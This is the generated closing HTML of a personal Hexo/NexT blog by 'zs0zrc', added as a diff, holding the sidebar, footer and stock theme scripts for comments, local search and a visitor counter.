+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="zs0zrc">
+            
+              <p class="site-author-name" itemprop="name">zs0zrc</p>
+              <p class="site-description motion-element" itemprop="description">zs0zrc's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://myhackerworld.top/" title="D4rk3r" target="_blank">D4rk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://m4x.fun/" title="M4X" target="_blank">M4X</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://n132.github.io/" title="n13r" target="_blank">n13r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io/" title="Twings" target="_blank">Twings</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">62.9k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz',
+        appKey: 'uYeHUkgtbToPh4mGzE7YJXNe',
+        placeholder: 'pwn pwn pwn',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz", "uYeHUkgtbToPh4mGzE7YJXNe");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
